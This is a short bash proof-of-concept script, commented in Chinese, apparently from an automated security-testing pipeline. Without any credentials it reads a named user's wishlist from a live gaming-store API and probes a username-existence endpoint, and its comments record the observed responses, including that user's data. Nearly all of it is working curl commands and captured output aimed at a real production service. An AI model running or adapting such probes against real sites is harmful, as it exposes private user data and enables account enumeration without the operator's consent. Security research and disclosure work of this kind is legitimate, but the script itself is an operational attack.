# greenmangaming.com /api/v2/wants/wantlist —— 免认证读取他人愿望单
# 用法: UA="$ARTEX_UA" ./greenmangaming_wantlist_unauth_read.sh <username>

USER="${1:-akassassinn1}"
UA="${UA:-$ARTEX_UA}"
BASE="https://www.greenmangaming.com/api/v2"

echo "[*] 主判据: 无 Cookie/无 Authorization 读取 $USER 的愿望单"
curl -s -i -A "$UA" "$BASE/wants/wantlist?username=$USER"
echo
echo "[*] 阴性对照: 不存在的用户名"
curl -s -A "$UA" "$BASE/wants/wantlist?username=zzqnope12345"; echo
echo "[*] 存在但无愿望单的账号"
curl -s -A "$UA" "$BASE/wants/wantlist?username=staff"; echo
echo "[*] 存在性预言机 (400=已存在 / 204=可用)"
curl -s -o /dev/null -w 'http_code=%{http_code}\n' -A "$UA" "$BASE/check_username?username=$USER"

# ---- 原始观测（2026-11-11, finding_id=91）----
# GET /api/v2/wants/wantlist?username=akassassinn1  (无 Cookie)
# HTTP/1.1 200
# {"Bookmark":"[[\"15bc1044-7373-4153-8752-da742707f56b\",1575543853253],\"15bc1044-7373-4153-8752-da742707f56b:Devil May Cry 5 - PC\"]","Count":1,"Games":[],"More":false}
#
# ?username=zzqnope12345 -> 200 null
# ?username=staff        -> 200 {"Bookmark":null,"Count":0,"Games":[],"More":false}
# /api/v2/check_username?username=akassassinn1 -> 400 "Username already exists..."
# /api/v2/check_username?username=zzqnope12345 -> 204
#
# 端点来源: /gsdrhtfdguf/ 测试页引用的 main.js 中 ApiService 定义
#   wantlist: p + "/wants/wantlist"   (p = https://www.greenmangaming.com/api/v2)
# 证据留存: /opt/artex/data/tasks/6/i813/wantlist_ev.txt, probe_get.txt, api_urls.tsv
